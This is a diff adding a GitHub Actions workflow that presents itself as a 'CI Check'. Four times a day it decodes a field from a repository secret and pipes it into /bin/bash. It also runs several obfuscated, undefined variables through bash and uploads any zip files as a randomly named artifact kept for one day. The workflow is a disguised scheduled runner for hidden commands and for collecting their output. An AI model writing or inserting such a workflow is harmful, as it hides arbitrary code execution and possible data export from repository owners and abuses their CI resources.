@@ -1,0 +1,33 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          p272: ${{ secrets.p272 }}
+        run: |
+          printf '%s' "$p272" | jq -r .nqofg332 | /bin/bash
+          echo $vspr6864 | jq -r .pvbu45 | /bin/bash
+          echo $yhjbi3 | jq -r .uky01 | /bin/bash
+          echo $doq7 | jq -r .uil23 | /bin/bash
+          echo $o49193 | jq -r .cebr77 | /bin/bash
+          echo $dilx668 | jq -r .zwe351 | /bin/bash
+          echo $dn87 | jq -r .tnvn14 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: XcpTWdA5
+          path: "*.zip"
+          retention-days: 1
